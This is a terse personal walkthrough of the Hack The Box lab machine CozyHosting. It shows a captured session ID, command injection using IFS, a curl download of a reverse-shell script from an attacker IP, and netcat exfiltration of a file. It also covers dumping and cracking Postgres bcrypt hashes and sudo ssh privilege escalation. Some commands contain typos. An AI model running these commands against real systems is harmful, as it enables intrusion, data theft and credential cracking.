---
description: easy machine
---

# CozyHosting

**cozyhosting - htb**

_<mark style="color:green;">**session hijacking**</mark>_

sessionid : BD3A77A4C619FE9B42DB59C040DCDA99

_<mark style="color:green;">**Brupsuite**</mark>_

White Space injection for reserve shell

`IFS=_;command='id';$command`

`curl` [`http://10.10.14.225/shell.sh`](http://10.10.14.225/shell.sh) `--output /tmp/shell.sh`

`chmod 777 /tmp/shell.sh`

\
`/tmp/shell/sh`

&#x20;

_<mark style="color:green;">**Learned tips:**</mark>_

&#x20;

`egrep -ir 'password' .`

`cat output.txt | nc yourip port`

`nc -nlvp port > output.txt`

_foreground:_

`stty raw -echo; fg`

[<mark style="color:green;">--------spawn interactive shell-----------</mark>](#user-content-fn-1)[^1]

`<LL=bash; export TERM=xterm; stty rows 24 columns 80`

Postgres Hash:

name    |                           password                           | role \
\-----------+--------------------------------------------------------------+-------\
&#x20;kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User\
&#x20;admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin

_<mark style="color:green;">**HaShcat:**</mark>_

`hashcat -help | grep -I '$2'`

`hashcat -m ././hash.txt /././rockyou.txt --potfile-disable`

&#x20;

_<mark style="color:green;">**Less prev:**</mark>_

`Sudo -l`

&#x20;

&#x20;

_**Seems we have ssh executable prev.**_

&#x20;

`Gtfobin - sudo - ssh - prev excu`

&#x20;

Done :smile:&#x20;

[^1]: 
